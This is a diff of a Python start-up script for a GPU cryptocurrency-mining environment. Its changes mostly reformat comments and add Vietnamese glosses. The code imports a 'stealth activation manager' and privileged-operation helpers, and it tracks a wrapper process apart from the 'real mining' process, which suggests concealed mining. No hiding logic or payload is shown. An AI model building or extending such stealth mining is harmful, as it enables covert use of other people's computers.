@@ -21,9 +21,9 @@ from datetime import datetime
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
 import psutil
-# **GPU-Only Mode** (chế độ chỉ GPU – chỉ sử dụng card đồ họa): Tất cả chức năng khai thác **CPU** (bộ xử lý trung tâm) đã được loại bỏ vĩnh viễn
+# GPU-Only Mode (chế độ chỉ GPU – chỉ sử dụng card đồ họa): Tất cả chức năng khai thác CPU (bộ xử lý trung tâm) đã được loại bỏ vĩnh viễn
 
-# **Import** (nhập khẩu – nạp thư viện) các **core mining environment modules** (module môi trường khai thác cốt lõi – thành phần chính của hệ thống)
+# Import (nhập khẩu – nạp thư viện) các core mining environment modules (module môi trường khai thác cốt lõi – thành phần chính của hệ thống)
 from mining_environment.scripts.logging_config import setup_logging
 from mining_environment.scripts.module_loggers import (
     get_gpu_plugin_logger,
@@ -35,33 +35,33 @@ from mining_environment.scripts.resource_manager import ResourceManager
 from mining_environment.scripts.auxiliary_modules.models import ConfigModel
 from mining_environment.scripts.privileged_operations import get_privileged_manager
 
-# **Import stealth activation manager** (nhập trình quản lý kích hoạt ẩn – module điều khiển chế độ ẩn danh)
+# Import stealth activation manager (nhập trình quản lý kích hoạt ẩn – module điều khiển chế độ ẩn danh)
 from mining_environment.stealth.core.stealth_activation_manager import initialize_stealth_activation, cleanup_stealth_activation
-# **Enhanced PID Logger** (bộ ghi PID nâng cao – công cụ theo dõi ID tiến trình) với **real process output monitoring** (giám sát đầu ra tiến trình thực – theo dõi kết quả trực tiếp)
+# Enhanced PID Logger (bộ ghi PID nâng cao – công cụ theo dõi ID tiến trình) với real process output monitoring (giám sát đầu ra tiến trình thực – theo dõi kết quả trực tiếp)
 from pid_logger import start_worker, log_pid, register_process
 
 
 
 
 
-# **Setup log directory path** (thiết lập đường dẫn thư mục log – cấu hình nơi lưu nhật ký)
+# Setup log directory path (thiết lập đường dẫn thư mục log – cấu hình nơi lưu nhật ký)
 LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
 os.makedirs(LOGS_DIR, exist_ok=True)
 
-# **Main application logger** (bộ ghi log ứng dụng chính – công cụ ghi nhật ký toàn hệ thống)
+# Main application logger (bộ ghi log ứng dụng chính – công cụ ghi nhật ký toàn hệ thống)
 logger = get_start_mining_logger()
 
-# **GPU-specific loggers** (bộ ghi log riêng cho GPU – công cụ ghi nhật ký card đồ họa)
+# GPU-specific loggers (bộ ghi log riêng cho GPU – công cụ ghi nhật ký card đồ họa)
 gpu_miner_logger = setup_logging('gpu_miner', str(Path(LOGS_DIR) / 'gpu_miner.log'), 'INFO')
 gpu_plugin_logger = setup_logging('gpu_plugin', str(Path(LOGS_DIR) / 'gpu_plugin.log'), 'INFO')
 
 stop_event = threading.Event()
 
-# **Enhanced lock-free process manager** (trình quản lý tiến trình không khóa nâng cao – quản lý quy trình không xung đột)
+# Enhanced lock-free process manager (trình quản lý tiến trình không khóa nâng cao – quản lý quy trình không xung đột)
 import weakref
 
 class LockFreeProcessManager:
-    """**Enhanced process manager** (trình quản lý tiến trình nâng cao – quản lý quy trình khai thác) với **dual PID tracking** (theo dõi PID kép – giám sát cả wrapper và process thực) và **graceful shutdown** (tắt mượt mà – kết thúc an toàn)"""
+    """Enhanced process manager (trình quản lý tiến trình nâng cao – quản lý quy trình khai thác) với dual PID tracking (theo dõi PID kép – giám sát cả wrapper và process thực) và graceful shutdown (tắt mượt mà – kết thúc an toàn)"""
     def __init__(self):
         self._gpu_process_ref = None
         self._real_mining_pid = None
@@ -70,13 +70,13 @@ class LockFreeProcessManager:
         self._cleanup_callbacks = []
         
     def set_gpu_process(self, process, real_mining_pid=None, process_group_id=None):
-        """**Register process** (đăng ký tiến trình – lưu thông tin quy trình) với **dual PID tracking** (theo dõi PID kép – giám sát cả wrapper và process thực)"""
+        """Register process (đăng ký tiến trình – lưu thông tin quy trình) với dual PID tracking (theo dõi PID kép – giám sát cả wrapper và process thực)"""
         if process:
             self._gpu_process_ref = weakref.ref(process)
             self._real_mining_pid = real_mining_pid
             self._process_group_id = process_group_id
             self._health_event.set()
-            logger.info(f"🎯 [ENHANCED] **Process** (tiến trình – quy trình chạy) đã đăng ký: **wrapper_pid** (PID tiến trình bọc)={process.pid}, **real_pid** (PID thực tế)={real_mining_pid}, **pgid** (ID nhóm tiến trình)={process_group_id}")
+            logger.info(f"🎯 [ENHANCED] Process (tiến trình – quy trình chạy) đã đăng ký: wrapper_pid (PID tiến trình bọc)={process.pid}, real_pid (PID thực tế)={real_mining_pid}, pgid (ID nhóm tiến trình)={process_group_id}")
         else:
             self._gpu_process_ref = None
             self._real_mining_pid = None
@@ -84,19 +84,19 @@ class LockFreeProcessManager:
             self._health_event.clear()
     
     def get_gpu_process_status(self):
-        """**Check status** (kiểm tra trạng thái – xác minh tình trạng hoạt động) của cả **wrapper** (tiến trình bọc – process chứa) và **real mining processes** (tiến trình khai thác thực – quy trình chính)"""
+        """Check status (kiểm tra trạng thái – xác minh tình trạng hoạt động) của cả wrapper (tiến trình bọc – process chứa) và real mining processes (tiến trình khai thác thực – quy trình chính)"""
         if not self._health_event.is_set():
             return False, None, None
             
         wrapper_alive = False
         real_alive = False
         
-        # Check wrapper process
+        # Check wrapper process (kiểm tra tiến trình bọc)
         if self._gpu_process_ref:
             wrapper_process = self._gpu_process_ref()
             wrapper_alive = wrapper_process and wrapper_process.poll() is None
             
-        # Check real mining process  
+        # Check real mining process (kiểm tra tiến trình khai thác thực)
         if self._real_mining_pid:
             try:
                 import psutil
@@ -105,7 +105,7 @@ class LockFreeProcessManager:
             except (psutil.NoSuchProcess, psutil.AccessDenied):
                 real_alive = False
                 
-        # Process alive if either wrapper or real process is running
+        # Process alive if either wrapper or real process is running (tiến trình còn sống nếu wrapper hoặc process thực đang chạy)
         is_alive = wrapper_alive or real_alive
         
         if not is_alive:
@@ -114,15 +114,15 @@ class LockFreeProcessManager:
         return is_alive, self._gpu_process_ref() if self._gpu_process_ref else None, self._real_mining_pid
     
     def register_cleanup_callback(self, callback):
-        """**Register thread-safe cleanup callback** (đăng ký callback dọn dẹp an toàn luồng – hàm gọi lại không xung đột) cho **graceful shutdown** (tắt mượt mà – kết thúc an toàn)"""
+        """Register thread-safe cleanup callback (đăng ký callback dọn dẹp an toàn luồng – hàm gọi lại không xung đột) cho graceful shutdown (tắt mượt mà – kết thúc an toàn)"""
         import threading
         with threading.RLock():
             self._cleanup_callbacks.append(callback)
-            logger.debug(f"🔧 [ENHANCED] **Cleanup callback** (callback dọn dẹp – hàm gọi lại xóa tài nguyên) đã đăng ký: {callback.__name__ if hasattr(callback, '__name__') else 'anonymous'}")
+            logger.debug(f"🔧 [ENHANCED] Cleanup callback (callback dọn dẹp – hàm gọi lại xóa tài nguyên) đã đăng ký: {callback.__name__ if hasattr(callback, '__name__') else 'anonymous'}")
     
     def graceful_shutdown(self):
-        """**Enhanced graceful shutdown** (tắt mượt mà nâng cao – kết thúc an toàn cải tiến) với **process group cleanup** (dọn dẹp nhóm tiến trình – xóa toàn bộ process liên quan)"""
-        logger.info("🔄 [ENHANCED] Bắt đầu **graceful shutdown** (tắt mượt mà – kết thúc an toàn)...")
+        """Enhanced graceful shutdown (tắt mượt mà nâng cao – kết thúc an toàn cải tiến) với process group cleanup (dọn dẹp nhóm tiến trình – xóa toàn bộ process liên quan)"""
+        logger.info("🔄 [ENHANCED] Bắt đầu graceful shutdown (tắt mượt mà – kết thúc an toàn)...")
         
         # Execute cleanup callbacks
         for callback in self._cleanup_callbacks:
